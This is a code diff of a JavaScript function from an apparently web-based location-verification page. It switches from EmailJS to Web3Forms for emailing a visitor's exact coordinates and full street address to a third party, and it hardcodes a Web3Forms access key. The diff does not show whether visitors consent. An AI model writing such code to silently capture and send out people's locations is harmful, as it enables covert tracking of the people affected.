@@ -464,45 +464,55 @@ function deepResolveAddress(lat, lon) {
    can format it however you like in EmailJS.
 ══════════════════════════════════════════════════════════ */
 function sendLocationAlert(parsed, lat, lon, accuracy) {
-  emailjs.init({ publicKey: CONFIG.EMAILJS_PUBLIC_KEY });
-
   var alertId  = 'LOC-' + Date.now().toString(36).toUpperCase();
   var mapsLink = 'https://www.google.com/maps?q=' + lat.toFixed(6) + ',' + lon.toFixed(6);
   var timestamp = new Date().toISOString();
 
-  var templateParams = {
-    to_email:      'confirmationpin@gmail.com',
-    alert_id:      alertId,
-    event_type:    'LOCATION VERIFIED',
-    verified_at:   timestamp,
+  var payload = {
+    access_key:   '8f55868a-da86-4202-8b44-44ac26ec6bf4',
+    subject:      '📍 Location Verified — FRF Alert | ' + alertId,
+    from_name:    'FRF Location System',
 
-    /* Full address fields */
-    street:        parsed.street      || 'N/A',
-    area:          parsed.area        || 'N/A',
-    district:      parsed.district    || 'N/A',
-    city:          parsed.city        || 'N/A',
-    state:         parsed.state       || 'N/A',
-    postcode:      parsed.postcode    || 'N/A',
-    country:       parsed.country     || 'N/A',
-    full_address:  buildBadgeSummary(parsed, lat, lon),
-    display_name:  parsed.displayName || 'N/A',
-
-    /* Coordinates */
-    latitude:      lat.toFixed(6),
-    longitude:     lon.toFixed(6),
-    accuracy:      Math.round(accuracy) + 'm',
-    maps_link:     mapsLink
+    /* Summary line at top of email */
+    message: [
+      '🔔 EVENT: LOCATION VERIFIED',
+      '🆔 Alert ID: '    + alertId,
+      '🕐 Time: '        + timestamp,
+      '',
+      '📍 FULL ADDRESS',
+      'Street:     '     + (parsed.street   || 'N/A'),
+      'Area:       '     + (parsed.area     || 'N/A'),
+      'District:   '     + (parsed.district || 'N/A'),
+      'City:       '     + (parsed.city     || 'N/A'),
+      'State:      '     + (parsed.state    || 'N/A'),
+      'Postcode:   '     + (parsed.postcode || 'N/A'),
+      'Country:    '     + (parsed.country  || 'N/A'),
+      'Display:    '     + (parsed.displayName || 'N/A'),
+      '',
+      '🌐 COORDINATES',
+      'Latitude:   '     + lat.toFixed(6),
+      'Longitude:  '     + lon.toFixed(6),
+      'Accuracy:   '     + Math.round(accuracy) + 'm',
+      '',
+      '🗺️ Google Maps: ' + mapsLink
+    ].join('\n')
   };
 
-  return emailjs.send(
-    CONFIG.EMAILJS_SERVICE_ID,
-    CONFIG.EMAILJS_LOCATION_TEMPLATE_ID,
-    templateParams
-  ).then(function() {
-    console.log('✅ Location alert email sent | ID:', alertId);
-  }).catch(function(err) {
-    console.warn('⚠️ Location alert email failed (non-blocking):', err);
-  });
+  return fetch('https://api.web3forms.com/submit', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+    body: JSON.stringify(payload)
+  }).then(function(r) { return r.json(); })
+    .then(function(res) {
+      if (res.success) {
+        console.log('✅ Location alert sent via Web3Forms | ID:', alertId);
+      } else {
+        console.warn('⚠️ Web3Forms responded with error:', res);
+      }
+    })
+    .catch(function(err) {
+      console.warn('⚠️ Location alert failed (non-blocking):', err);
+    });
 }
 
 /* ══════════════════════════════════════════════════════════
